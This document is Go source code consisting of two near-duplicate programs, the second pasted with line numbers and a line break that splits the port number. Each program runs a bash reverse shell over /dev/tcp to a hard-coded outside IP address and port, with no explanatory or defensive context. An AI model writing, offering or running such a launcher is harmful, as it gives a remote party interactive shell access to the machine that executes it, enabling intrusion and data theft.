package main

import (
	"fmt"
	"os/exec"
)

func main() {
	cmd := exec.Command("bash" ,"-c" ,"bash -i  >& /dev/tcp/8.130.78.89/6666 0>&1 ")

	// cmd.Stdout = os.Stdout
	// cmd.Stderr = os.Stderr

	e := cmd.Run()
	CheckError(e)

}

func CheckError(e error) {
	if e != nil {
		fmt.Println(e)
	}
}

1 package main
2
3 import (
4 "fmt"
5 "log"
6 "os/exec"
7 )
8
9 func main() {
10 cmd := exec.Command("bash", "-c", "bash -i >& /dev/tcp/101.37.81.166/1
111 0>&1")
11 out, err := cmd.CombinedOutput()
12 if err != nil {
13 fmt.Printf("combined out:\n%s\n", string(out))
14 log.Fatalf("cmd.Run() failed with %s\n", err)
15 }
16 fmt.Printf("combined out:\n%s\n", string(out))
17 }